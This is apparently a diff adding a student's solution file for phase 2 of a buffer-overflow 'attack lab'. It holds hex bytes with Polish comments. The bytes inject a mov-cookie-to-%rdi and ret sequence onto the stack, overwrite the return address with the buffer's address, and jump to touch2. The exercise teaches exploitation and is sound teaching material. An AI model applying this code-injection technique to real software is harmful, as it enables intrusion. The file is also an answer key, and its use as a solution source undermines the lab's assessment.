@@ -1,0 +1,6 @@
+48 c7 c7 5e 04 bc 19    /* wypelnienie bufora instrukcja mov $0x19bc045e(Cookie), %rdi */
+c3			/* wypelnie bufora instrukcja ret */
+00 00 00 00 00 00 00 00 /* wypelnienie bufora znakami */
+00 00 00 00 00 00 00 00 /* wypelnienie bufora znakami */
+28 6c 61 55 00 00 00 00 /* nadpisanie adresu powrotu adresem wstrzykniętych instrukcji */
+97 1c 40 00 00 00 00 00 /* adres funkcji touch2 */
